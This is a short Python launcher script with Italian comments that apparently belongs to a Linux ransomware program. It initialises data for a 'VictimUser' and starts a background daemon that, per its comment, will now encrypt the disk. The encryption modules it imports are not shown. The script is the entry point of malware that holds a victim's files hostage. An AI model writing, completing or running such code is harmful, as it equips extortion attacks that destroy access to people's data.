#!/usr/bin/python
import User
from daemon import runner
import DaemonLinux

# Inizializzazione dati utente
myUser = User.VictimUser()
myUser.initUserData()

# Il demone adesso pensera' a cifrare il disco
daemon = DaemonLinux.DaemonLinux()
daemon_runner = runner.DaemonRunner(daemon)
daemon_runner.do_action()
